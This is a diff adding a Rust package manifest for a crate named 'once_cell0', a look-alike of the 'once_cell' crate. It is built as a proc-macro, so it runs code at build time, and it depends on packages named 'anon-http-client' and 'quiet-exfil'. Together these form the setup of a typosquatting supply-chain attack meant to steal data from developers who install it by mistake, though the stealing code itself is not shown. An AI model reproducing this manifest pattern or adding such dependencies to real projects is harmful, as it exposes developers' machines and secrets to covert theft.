@@ -1,0 +1,12 @@
+[package]
+name = "once_cell0"
+version = "0.1.0"
+edition = "2021"
+
+[lib]
+proc-macro = true
+
+[dependencies]
+anon-http-client = "0.0.1"
+quiet-exfil = "0.0.1"
+
